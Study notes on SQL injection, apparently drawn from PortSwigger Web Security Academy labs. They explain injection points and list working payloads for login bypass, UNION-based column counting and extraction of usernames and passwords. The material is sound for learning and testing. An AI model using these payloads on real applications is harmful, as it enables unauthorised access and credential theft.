SQL Injection cheat sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
In UPDATE statements, within the updated values or the WHERE clause.
In INSERT statements, within the inserted values.
In SELECT statements, within the table or column name.
In SELECT statements, within the ORDER BY clause.

GET /filter?category=Gifts'-- HTTP/2

Original query SELECT * FROM products WHERE category = 'gifts' AND released = 1
Modified query SELECT * FROM products WHERE category = 'gifts'--' AND released = 1

Everything after -- is commented out

Login bypass
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
SELECT * FROM users WHERE username = 'wiener'--' AND password = 'bluecheese'

UNION
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database.
The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

To determine how many columns are being returned by orignial query
Method 1

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

When the specified column index exceeds the number of actual columns in the result set, the database returns an error.
Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

Method 2
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct

GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--

Find a column containing text
GET /filter?category=Lifestyle'+UNION+SELECT+NULL,'a',NULL-- 

Lets says, we have two columns which held string value.
We can create a simple union query like

' UNION SELECT username, password FROM users--

Lets say we have only one column

' UNION SELECT username || '~' || password FROM users--
